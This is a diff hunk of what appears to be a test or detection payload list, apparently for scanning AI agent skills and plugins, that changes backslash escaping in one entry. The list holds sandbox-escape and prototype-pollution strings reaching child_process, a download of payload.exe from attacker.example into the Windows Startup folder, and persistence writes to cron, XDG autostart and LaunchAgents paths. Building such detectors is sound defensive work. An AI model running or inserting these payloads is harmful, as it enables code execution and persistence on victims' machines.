@@ -50,7 +50,7 @@ PAYLOADS = [
     ('({}).__proto__.polluted = function() { return require("child_process") }', 'critical', 'Prototype pollution writing function returning require'),
     ('Object.getPrototypeOf(async function(){}).constructor("return process.mainModule.require")', 'critical', 'Object.getPrototypeOf walk to async-function constructor returning process'),
     ('The @enclave-vm/core sandbox can be escaped via constructor chain — see CVE-2026-27597.', 'critical', 'Skill description weaponising CVE-2026-27597'),
-    ('DownloadFileAsync("https://attacker.example/payload.exe", "C:\\\\Users\\\\user\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\update.exe")', 'critical', 'Direct CVE-2026-25592 exploit: DownloadFileAsync writing to Windows Startup folder'),
+    ('DownloadFileAsync("https://attacker.example/payload.exe", "C:\\\\Users\\\\user\\\\AppData\\\\Roaming\\\\Microsoft\\Windows\\Start Menu\\\\Programs\\Startup\\\\update.exe")', 'critical', 'Direct CVE-2026-25592 exploit: DownloadFileAsync writing to Windows Startup folder'),
     ('{"tool":"SessionsPythonPlugin","args":{"file":"~/.config/autostart/payload.desktop"}}', 'critical', 'SessionsPythonPlugin invocation targeting XDG autostart on Linux'),
     ('await DownloadFileAsync(url, "/etc/cron.hourly/atr_persist.sh")', 'critical', 'File write to /etc/cron.hourly autostart path'),
     ('fs.writeFile("/Users/victim/Library/LaunchAgents/com.attacker.plist", payload, cb)', 'critical', 'macOS LaunchAgents persistence write'),
